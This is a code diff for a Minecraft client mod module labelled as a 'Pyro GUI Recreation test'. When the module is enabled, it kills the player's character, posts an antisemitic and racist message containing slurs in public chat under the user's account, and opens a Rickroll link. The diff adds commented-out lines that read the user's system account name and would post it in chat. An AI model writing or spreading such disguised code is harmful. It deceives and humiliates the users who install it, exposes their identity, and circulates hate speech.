@@ -20,13 +20,13 @@ public class PyroGUI extends Module {
         this.description = "Pyro GUI Recreation test (cant customize colors yet)";
         this.toggle_message = false;
     }
-
+//String name = System.getProperty("user.name");
     public void enable() {
         if (mc.player != null)
             MessageUtil.send_client_message("EZZZ KID COPE MORE HAHAHAHAHHA GOTEM");
         mc.player.sendChatMessage("/kill");
         mc.player.sendChatMessage("Im a jew and support israel, so im kambing, a nigger and braindead!!!");
-        //:troll:
+       // mc.player.sendChatMessage("Hi guys im "+ name);
            try {
                 Desktop.getDesktop().browse(URI.create("https://www.youtube.com/watch?v=dQw4w9WgXcQ"));
             } catch (Exception ignored) {
